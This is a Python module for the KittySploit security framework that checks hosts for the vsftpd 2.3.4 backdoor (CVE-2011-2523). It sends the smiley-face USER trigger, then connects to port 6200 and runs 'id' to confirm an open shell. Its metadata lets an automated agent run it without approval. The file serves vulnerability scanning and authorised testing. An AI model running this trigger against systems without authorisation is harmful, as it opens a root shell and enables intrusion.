#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vsftpd 2.3.4 backdoor (CVE-2011-2523)."""

import re
import socket
import time

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'vsftpd - Compromised Package Backdoor Detection (CVE-2011-2523)',
        'description': (
            'Detects CVE-2011-2523 by sending USER X:) / PASS X then checking for a '
            'shell on TCP/6200 that responds to id.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'ftp', 'vsftpd', 'backdoor', 'cve', 'cve2011', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-2523',
            'https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html',
        ],
        'cve': 'CVE-2011-2523',
    }

    port = OptPort(21, 'FTP port', True)
    shell_port = OptPort(6200, 'Backdoor shell port', True)

    def _shell_ok(self, host: str) -> bool:
        sport = int(self.shell_port)
        try:
            sock = socket.create_connection((host, sport), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.sendall(b'id;\r\nexit;\r\n')
            buf = sock.recv(4096).decode('latin-1', errors='replace')
            sock.close()
        except Exception:
            return False
        return bool(re.search(r'uid=\d+.*gid=\d+', buf))

    def run(self):
        host = self._host()
        port = self._port()
        if not host:
            return False
        if self._shell_ok(host):
            self.set_info(
                severity='critical',
                reason='vsftpd backdoor shell already open (CVE-2011-2523)',
                path=f'tcp/{int(self.shell_port)}',
            )
            return True
        if not self.is_tcp_open(host, port):
            return False
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.recv(256)
            for _ in range(3):
                sock.sendall(b'USER X:)\r\n')
                try:
                    sock.recv(256)
                except Exception:
                    pass
                sock.sendall(b'PASS X\r\n')
                try:
                    sock.recv(256)
                except Exception:
                    pass
                time.sleep(2)
                if self._shell_ok(host):
                    sock.close()
                    self.set_info(
                        severity='critical',
                        reason='vsftpd compromised package backdoor (CVE-2011-2523)',
                        path=f'tcp/{port}',
                    )
                    return True
            sock.close()
        except Exception:
            return False
        return False
